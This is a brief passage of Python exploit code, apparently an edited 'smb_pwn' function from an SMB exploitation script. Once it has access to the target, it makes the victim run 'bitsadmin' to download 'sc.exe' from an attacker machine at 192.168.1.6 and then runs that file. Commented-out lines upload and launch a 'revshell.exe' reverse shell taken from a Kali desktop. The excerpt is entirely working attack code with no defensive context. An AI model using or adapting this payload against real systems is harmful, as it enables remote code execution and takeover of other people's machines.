...
def smb_pwn(conn, arch):
	...
	#smb_send_file(smbConn, sys.argv[0], 'C', '/home/kali/Desktop/revshell.exe')
## -- Exploit/payload line -- ## 				-- -- -- -- -- -- -- -- --	
	service_exec(conn, r'cmd /c bitsadmin /transfer pwn /download http://192.168.1.6/sc.exe C:\sc.exe')
	service_exec(conn, r'cmd /c /sc.exe')
	#service_exec(conn, r'cmd /c /revshell.exe')
